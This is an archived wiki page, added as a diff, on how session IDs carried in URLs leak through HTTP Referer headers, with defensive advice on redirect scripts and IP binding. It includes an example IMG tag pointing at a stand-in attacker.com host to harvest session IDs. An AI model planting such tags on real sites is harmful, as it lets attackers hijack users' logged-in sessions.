@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="generator" content="Docutils 0.13: http://docutils.sourceforge.net/" />
+<title>URL Session ID Security</title>
+<link rel="stylesheet" href="wiki.css" type="text/css" />
+</head>
+<body>
+<div class="document" id="url-session-id-security">
+<h1 class="title">URL Session ID Security</h1>
+
+<p>You should consider security concerns if you don't use a cookie for
+the session ID, i.e., if you use a technique with URLs like
+<span class="docutils literal">/WK/_SID_=1239872987/SomeServlet_</span> or
+<span class="docutils literal"><span class="pre">/WK/SomeServlet_?_SID_=124987254</span></span></p>
+<p>If the ID is for a logged in session (i.e. the user has typed a
+password) and needs to be protected from unauthorized access, you have
+to be careful of any links on your page that point to other sites.  If
+the user's browser is pointing at:</p>
+<pre class="literal-block">http://foo.bar/cgi-bin/WebKit_.cgi/_SID_=3678268432/MyServlet</pre>
+<p>and the user clicks a link on the page to www.attacker.com/whatever,
+then the browser will normally send an HTTP GET request to the
+attacker.com server containing an HTTP REFERER header which has your
+page's URL including the session ID.  The attacker can then use the
+session ID from the referer header to hijack the user session.  If
+you're running something like a web bbs where attackers can drop their
+own URL's into messages that they post, they can carry out the attack
+without you (the foo.bar owner) ever adding any links of your own to
+the attacker.</p>
+<p>The user doesn't even have to be made to click a link.
+if your page (because of you or the attacker) contains an:</p>
+<pre class="literal-block">&lt;IMG src=http://www.attacker.com/whatever&gt;</pre>
+<p>to display an image, the attack happens before the user has a chance
+to do anything about it. -- PaulRubin</p>
+<p>You can secure against this kind of attack by using a redirect script
+for all external links.  I.e., you replace all links (href and img,
+perhaps script, style, and link) in all your output.  So if you would
+have had a link like <span class="docutils literal"><span class="pre">http://www.booger.com/green</span></span> you'd use
+<span class="docutils literal"><span class="pre">/WK/Redirect?site=www.booger.com/green</span></span> where you install some
+simple redirect script on your server at <span class="docutils literal">/WK/Redirect</span></p>
+<p>Also, you'd get a certain amount of security if you didn't allow
+people to access a session from a new IP address.  You could add the
+original IP address (from &lt;tt&gt;req.environ()['HOST_ADDR']&lt;/tt&gt;) to the
+session, and check that it's consistent in your <a class="reference external" href="sitepage.html">SitePage</a>'s awake()
+method.  Dialup users who get disconnected will also get trapped by
+this, and they will curse you (just so you know what you are losing).</p>
+<p>Note -- normal dialup users who sit behind transparent proxies will
+run into this problem a <em>lot</em>.</p>
+<p>-- FariedNawaz - 12 Jul 2002 ]</p>
+<p>Followup Note: Transparent proxies can be partly cured with use of X-Forwarded-For header field stating the ip address of user of the proxy, but this field can be faked by attacker, so it is not way out of the problem :(</p>
+<p>Lastly, if you use SSL, browsers will typically not allow non-secure
+content to be loaded without a warning (like an IMG).  I'm not sure if
+secure content from another (potentially malicious) server would be
+loaded, or what referers are passed from secure connections.</p>
+</div>
+<div class="footer">
+<hr class="footer" />
+<p><a class="reference external" href="./index.html">Ye Olde Webware for Python Wiki</a>, 24 Jan 2005</p>
+
+</div>
+</body>
+</html>
